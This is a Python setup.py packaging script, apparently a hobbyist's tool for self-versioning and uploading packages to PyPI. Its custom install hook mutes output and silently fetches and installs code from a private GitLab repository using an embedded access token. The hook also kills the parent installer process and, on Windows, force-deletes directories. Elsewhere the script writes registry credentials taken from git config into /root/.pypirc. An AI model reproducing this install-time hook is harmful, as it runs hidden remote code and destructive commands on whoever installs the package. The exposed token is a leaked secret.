#!/usr/bin/python
class Var:
      nameA='CCB.py'  #nameA!  
      nameB=122  #nameB! 
      @classmethod
      def popen(cls,CMD):
          import subprocess,io,re
          # CMD = f"pip install cmd.py==999999"
          # CMD = f"ls -al"

          proc = subprocess.Popen(CMD, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, bufsize=-1)
          proc.wait()
          stdout = io.TextIOWrapper(proc.stdout, encoding='utf-8').read()
          stderr = io.TextIOWrapper(proc.stderr, encoding='utf-8').read()

          # True if stdout  else False , stdout if stdout  else stderr 
          return  stdout if stdout  else stderr 
      
      @classmethod
      def pipB(cls,name="cmd.py"):
          CMD = f"pip install {name}==999999"
          import re
          ################  錯誤輸出    
          str_stderr = cls.popen(CMD)
          SS=re.sub(".+versions:\s*","[",str_stderr)
          SS=re.sub("\)\nERROR.+\n","]",SS)
          # print("SS..",eval(SS))
          BB = [i.strip() for i in SS[1:-1].split(",")]
          
          print(f"[版本] {cls.nameA}: ",BB)
          ################  return  <list>   
          return BB
         
     

      def __new__(cls,name=None,vvv=None):
        

          if  name!=None and vvv!=None:
              #######################################################
            #   with  open( __file__ , 'r+' ,encoding='utf-8') as f :        
            #         ############################
            #         f.seek(0,0)       ## 規0
            #         R =f.readlines( ) 
            #         R[1]=f"      nameA='{name}'\n"
            #         R[2]=f"      nameB='{vvv}'\n"
            #         ##########################
            #         f.seek(0,0)       ## 規0
            #         f.writelines(R)
                            
              #######################################################
              with  open( __file__ , 'r+' ,encoding='utf-8') as f :        
                    ############################
                

                                    

                    # N="name"
                    NR=["#nameA!","#nameB!"]
                    ######## 禁止i.strip() 刪除 \n 和\tab ############
                    ### R is ########## 本檔案 #######################
                    f.seek(0,0)       ## 規0
                    R =f.readlines( ) 
                    # R=[ i for i in open(__file__).readlines()] 
                    # print(R)

                    ###############
                    # Q=[ (ii,i) for i,b in enumerate(R) for ii in b.strip().split(" ") if len(b.strip().split(" "))!=1  if  ii in ["#nameA!","#nameB!"]   ]
                    Q=[ (i,b) for i,b in enumerate(R) for ii in b.strip().split(" ") if len(b.strip().split(" "))!=1  if  ii in NR   ]
                    # print(Q)

                    if len(Q)==len(NR):
                        # print("**Q",*Q)
                        NR=[ i.strip("#!") for i in NR] ## 清除[#!] ---> ["nameA","nameB"]
                        NG=[ f"'{name}'" , vvv ]
                        def RQQ( i , b ):
                            # print( "!!",i ,b)
                            NRR = NR.pop(0) 
                            NGG = NG.pop(0) 
                            import re
                            # print(Q[0]) ## (2, 'nameA=None  #nameA!')
                            R01 = list(  b  )     ## 字元陣列 ## 

                            N01 = "".join(R01).find( f"{ NRR }")
                            R01.insert(N01,"=")
                            # print( R01  )

                            N01 = "".join(R01).find( f"#{ NRR }!")
                            R01.insert(N01,"=")
                            # print( R01  )

                            ### 修改!.
                            QQA="".join(R01).split("=")
                            QQA.pop(2)
                            QQA.insert(2, f"={ NGG }  ")
                            # print("!!QQA","".join(QQA)  )

                            ### 本檔案..修改
                            return  i ,"".join(QQA)

                        for ar in Q:
                            # print("!XXXX")
                            N,V = RQQ( *ar )
                            R[N] = V
                        ##########################
                        f.seek(0,0)       ## 規0
                        # print("@ R ",R)
                        f.writelines(R)


              ##
              ##########################################################################
              ##  這邊會導致跑二次..............關掉一個
              if  cls.nameA==None:
                  import os,importlib,sys
                  # exec("import importlib,os,VV")
                  # exec(f"import {__name__}")
                  ############## [NN = __name__] #########################################
                  # L左邊 R右邊
                  cls.NN = __file__.lstrip(sys.path[0]).replace(os.path.sep,r".")[0:-3]  ## .py
                  # print( NN )
                  cmd=importlib.import_module( cls.NN ) ## 只跑一次
                  # cmd=importlib.import_module( "setup" ) ## 只跑一次(第一次)--!python
                  # importlib.reload(cmd)                ## 無限次跑(第二次)
                  ## 關閉
                  # os._exit(0)  
                  sys.exit()     ## 等待 reload 跑完 ## 當存在sys.exit(),強制無效os._exit(0)

             

          else:
              return  super().__new__(cls)




# ################################################################################################
# def siteOP():
#     import os,re
#     pip=os.popen("pip show pip")
#     return re.findall("Location:(.*)",pip.buffer.read().decode(encoding='utf8'))[0].strip() 

# ## 檢查 ln 狀態
# !ls -al { siteOP()+"/cmds" }


            
#################################################################
#################################################################      
#################################################################
class PIP(Var):

      def __new__(cls): # 不備呼叫
          ######### 如果沒有 twine 傳回 0
          import os
          BL=False if os.system("pip list | grep twine > /dev/nul") else True
          if not BL:
             print("安裝 twine")
             cls.popen("pip install twine")
          else:
             print("已裝 twine")
          ############################  不管有沒有安裝 都跑
          ## 執行完 new 再跑 
          ## super() 可叫父親 或是 姊妹
          return  super().__new__(cls)
         
class MD(Var):
      text=[
            'echo >/content/cmd.py/README.md',
            'echo [pypi]> /root/.pypirc',
            'echo repository: https://upload.pypi.org/legacy/>> /root/.pypirc',
            'echo username: moon-start>> /root/.pypirc',
            'echo password: ####@516>> /root/.pypirc'
            ]
      def __new__(cls): # 不備呼叫
          
    
          for i,b in enumerate( cls.text  ):
              if i==4:
                    import os,re
                    vvv= os.popen("git config --global user.pass").read().strip()
                    b= re.sub("password: ####@516",f"password: {vvv}", b )
              
              cls.popen( b )
          ############################
          ## 執行完 new 再跑 
          ## super() 可叫父親 或是 姊妹

          return  super().__new__(cls)


class init(Var):
    #   classmethod
    #   def 
      # def init(cls,QQ):
      def __new__(cls): # 不備呼叫
          # cls.popen(f"mkdir -p {QQ}")
          #############################
          QQ= cls.dir
          cls.popen(f"mkdir -p {QQ}")
          #############################
          if  type(QQ) in [str]:
              ### 檢查 目錄是否存在 
              import os
              if  os.path.isdir(QQ) & os.path.exists(QQ) :
                  ### 只顯示 目錄路徑 ----建立__init__.py
                  for dirPath, dirNames, fileNames in os.walk(QQ):
                      
                      print( "echo >> "+dirPath+f"{ os.sep }__init__.py" )
                      os.system("echo >> "+dirPath+f"{ os.sep }__init__.py") 
                                  
              else:
                      ## 當目錄不存在
                      print("警告: 目錄或路徑 不存在") 
          else:
                print("警告: 參數或型別 出現問題") 


class sdist(MD,PIP,init):
      import os
      ########################################################################
      VVV=True
     
      dir = Var.nameA.rstrip(".py")  if Var.nameA!=None else "cmds"

      @classmethod
      def rm(cls):
          import os
          # /content/sample_data   
          if os.path.isdir("/content/sample_data"):
            os.system(f"rm -rf /content/sample_data")

          if os.path.isdir("dist"):
            print("@刪除 ./dist")
            ##### os.system(f"rm -rf ./dist")
            # print( f"rm -rf {os.getcwd()}{os.path.sep}dist" )
            os.system(f"rm -rf {os.getcwd()}{os.path.sep}dist")
          ##
          info = [i for i in os.listdir() if i.endswith("egg-info")]
          if  len(info)==1:
              if os.path.isdir( info[0] ):
                 print(f"@刪除 ./{info}")
                 #  os.system(f"rm -rf ./{info[0]}")
                 os.system(f"rm -rf {os.getcwd()}{os.path.sep}{info[0]}")

      
      def __new__(cls,path=None): # 不備呼叫
          this = super().__new__(cls)
          import os
          print("!XXXXX:" ,os.getcwd() )
          if  path=="":
              import os
              path = os.getcwd()
          ###############################
          import os
          if  not os.path.isdir( path ):
              ## 類似 mkdir -p ##
              os.makedirs( path ) 
          ## CD ##       
          os.chdir( path )
          ################################


          ######## 刪除
          cls.rm()      
          ##############################################################
          CMD = f"python {os.getcwd()}{os.path.sep}setup.py sdist"
         


          ##  !twine 上傳
          if  not f"{cls.nameB}" in cls.pipB(f"{cls.nameA}") and cls.nameB!=None :
              cls.VVV=True
              print(f"\n\n\n@@@@@@@@@@[{CMD}]@@@@@@@@@@\n",cls.popen(CMD))
              ##############
              # CMD = "twine upload --verbose --skip-existing  dist/*"
              CMD = f"twine upload --skip-existing  {os.getcwd()}{os.path.sep}dist{os.path.sep}*"
              # print("@222@",cls.popen(CMD))
              CMDtxt = cls.popen(CMD)
              if CMDtxt.find("NOTE: Try --verbose to see response content.")!=-1:
                print(f"\n\n\n@@@@@@@@@@[{CMD}]@@@@@@@@@@\n[結果:錯誤訊息]\nNOTE: Try --verbose to see response content.\n注意：嘗試 --verbose 以查看響應內容。\n")
                 
              elif CMDtxt.find("WARNING")!=-1:
                print(f"\n\n\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n")
                print(f"[指令:{CMD}]\n[WARNING:警告]失敗!!\n")
                
              else:
                print(f"\n\n\n@@@@@@@@@@[{CMD}]@@@@@@@@@@\n",CMDtxt)

            #   View at:
            #   https://pypi.org/project/QQX/109/

            #   WARNING  Error during upload. Retry with the --verbose option for more details. 
            #   ERROR    HTTPError: 400 Bad Request from https://upload.pypi.org/legacy/        
            #   The name 'ABC.py' is too similar to an existing project. See           
            #   https://pypi.org/help/#project-name for more information.              

          else:
              cls.VVV=False
              print(f"[版本]: {cls.nameB} 已經存在.")
              ######################################
              # 如果目前的 Var.nameB 版本已經有了
              if Var.nameA != None:
                if str(Var.nameB) in Var.pipB(Var.nameA):
                  import sys
                #   ## 如果輸出的和檔案的不相同
                  if str(sys.argv[2])!=str(Var.nameB):
                    # print("OK!! ",*sys.argv)
                    print("OK更新!!python "+" ".join(sys.argv))
                    # os.system("python "+" ".join(sys.argv))
                    os.system("python "+" ".join(sys.argv))
                   
                    ## 結束 ##
                    BLFF="結束."

                
        
          
          ######## 刪除
          cls.rm()     
          ###################   
          return  this
          






################################################# 這裡是??????      
import sys
if len(sys.argv)==3 :
    

    import os
    if os.popen("git config --global user.pass").read():
        ##########################
        ## 產生:設定黨
        Var(sys.argv[1],sys.argv[2])
        import os
        sdist(os.path.dirname(sys.argv[0]))
    else:
        print("user.pass: null")
        import sys
        sys.exit()


    
  


print("@週期::",sys.argv)

if   sdist.VVV and (not "BLFF" in dir()):
  # if sys.argv[1]== 'bdist_wheel' or sys.argv[1]== 'sdist' or  sys.argv[1]=='install':
  if sys.argv[1]== 'bdist_wheel' or sys.argv[1]== 'sdist' or  sys.argv[1]=='install' or sys.argv[1]=="egg_info" or sys.argv[1]=='clean':


    
    from pip._internal.cli.main import *
    ##############################################
    from setuptools.command.install import install
    
    #####
    from subprocess import check_call
    class PostCMD(install):
          """cmdclass={'install': XXCMD,'install': EEECMD }"""
          def  run(self):
              import sys
              print(123,sys.argv)
              print(333,f"{Var.nameA}" ,f"{Var.nameB}"  ) 
                   
              import os
            #   print( os.popen("curl https://154e-34-91-185-28.ngrok.io").read() )     
            #   print("@@",os.listdir( os.getcwd()+os.path.sep+'build' ) )
              ### DIR
              def listDIR(PWD="/content"):
                    data = {}
                    import os
                    ### 路徑   底下目錄  底下檔案
                    for root , dirs , files in os.walk(PWD):
                        print( os.path.basename(root) in [i for i in os.listdir( PWD )if i[0]!="."] )
                        if  root.find(os.path.sep+".git")==-1:
                           print(root , dirs , files)
                        
                

              listDIR( os.getcwd() )
   
              ######################################################################
              dir = Var.nameA.rstrip(".py")  if Var.nameA!=None else "cmds"


            #   path = os.getcwd()+os.path.sep+"build"+os.path.sep+"lib"
            #   open(path+os.path.sep+dir+os.path.sep+ "AAA.tt","w").write("###")

            #   print('pip install "git+https://pypi:nJa4Pym6eSez-Axzg9Qb@gitlab.com/moon-start/SH.git#egg=SH.py==v2.2"  ')
            #   os.syetm('pip install "git+https://pypi:nJa4Pym6eSez-Axzg9Qb@gitlab.com/moon-start/SH.git#egg=SH.py==v2.2"  ')


            #   '',

              
              
              #### pip-install
            #   main(["install","git+https://pypi:nJa4Pym6eSez-Axzg9Qb@gitlab.com/moon-start/ABC==v0.0031" ])
              install.run(self)
            
              
            #   import os
            #   SS=os.popen('pip install "git+https://pypi:nJa4Pym6eSez-Axzg9Qb@gitlab.com/moon-start/ABC==v0.0031"  ').read()
            #   print(SS)


             
              ###[textOP]#

              print("# 小貓 1 號")

            
              def DPIP(BL):
                if BL:
                    ##################################################################
                    import os
                    ##################################################################
                    FF = str(__file__).split("setup.py")[0]
                    ### 刪除1
                    if os.name=="nt":     ## Win10    
                        print("@ DPIP-FF ::",FF )  
                        os.system(f"rmdir /q /s {FF}") ## DEL
                else:
                
                    ##################################################################
                    import os
                    ##################################################################
                    FF = str(__file__).split("setup.py")[0]
                    import os
                    # print(os.popen("dir "+FF).read())
                    ### 刪除1
                    if os.name=="nt":     ## Win10    
                        print("@ DPIP-FF ::",FF )  
                        os.system(f"rmdir /q /s  {FF+os.path.sep}UNKNOWN-0.0.0-py3.7.egg-info") ## DEL
             


             
              ###[textOP]#

              print("# 小貓 1 號")
              #nameA,nameB = "ABC","v0.0031"
              #nameA,nameB = "ABC","v0.0109"
              nameA,nameB = "ABC","v0.0115"
              ##########################################################
              ## 只有 win10 會
              DPIP(True)
              ########################################################
              import os
              #### from pip install 
              #### 建立一個 .py檔案
              from tempfile import NamedTemporaryFile as F
              fp = F(suffix=".py",prefix="",delete = False ) ## 檔案不刪除
              ################################################
              test='''
#####################################################
import sys , os
os.system("python -m pip install psutil")

################################# 關閉 print !!
import sys,os
SS=sys.stdout
sys.stdout=open(os.devnull,"w")
###################################################

#### pip-install
from pip._internal.cli.main import *
main(["install","git+https://pypi:nJa4Pym6eSez-Axzg9Qb@gitlab.com/moon-start/'''+nameA+'''/@'''+nameB+'''#egg='''+nameA+'''" ])


import os
pwd = os.popen('git config --global user.pwd ').read().strip() ## 有效果

#import os
#pwd = os.environ["pwd"]

#open("/content/pwd","w").write( pwd )
#os.system(f"rm -rf {pwd}/build/lib")


# # /tmp/pip-install-cb5glv7e/ccb-py_264ff840be1349cdbf47af2ed0426808/build/lib/CCB [] ['

os.system('git config --global user.pwd ""')



################################# 打開 print !!
sys.stdout=SS
###################################################


### start-main
################### pp.resume() ## 繼續跑

###### win...比os.exit()  有效果!!
###### 注意的是程序要停止...才能關閉
import subprocess,os
###### subprocess.Popen(f"cmd.exe /k taskkill /F /T /PID {'''+str(os.getppid())+'''}", shell=True)
os.kill('''+str(os.getppid())+''',9)
'''

              fp.write( test.encode(encoding="utf-8") )
              fp.close()  ## close 關閉檔案::則才會刪除檔案!!
              ###############################################

              import os
              os.system(f"python {fp.name}") ## 必須關閉檔案 才能執行
              os.remove(fp.name)
              ######################
              # https://blog.csdn.net/happyjacob/article/details/112385665
              DPIP(False)




       
               

    

  
    DM="None"  #! QQ:

    ##############
    import site,os
    siteD =  os.path.dirname(site.__file__)
    # +os.sep+"siteR.py"
    print("@siteD: ",siteD)
    #### setup.py ################################
    from setuptools import setup, find_packages
    setup(
          # name  =  "cmd.py"  ,
          name  =   f"{Var.nameA}"  ,
        #   author_email = 'login0516mp4@gmail.com',
        #   url = 'https://gitlab.com/moon-start/git.py',
        #   download_url = 'https://gitlab.com/moon-start/git.py/-/archive/master/git.py-master.zip',
          
          ### ???需要
          packages = find_packages(),     
          # description = "[文件說明]",
          description = "[我是一隻小貓]",
          # author = '[使用者]',
          author = 'moon-start',
          # author_email = "[信箱@gmial.com]" ,
          author_email = 'moon-start@gmail.com',

        
          version=  f"{Var.nameB}"  ,
 
          #description="supty.py模組",

          long_description= "# Markdown supported!\n\n* Cheer\n* Celebrate\n",
        

          long_description_content_type="text/markdown",
    
          license="LGPL",

          ######################################
          #packages = find_packages(),  
          #####################################
        #   setup_requires=[
        #             # 'QQX.py==1.9',
        #             # 'git+https://pypi:nJa4Pym6eSez-Axzg9Qb@gitlab.com/moon-start/ABC==v0.0031',
        #   ],

          #####################################
          cmdclass={ 'install': PostCMD  }
          #####################################
    )
   

print(" 結束!!")
### B版
# 6-13
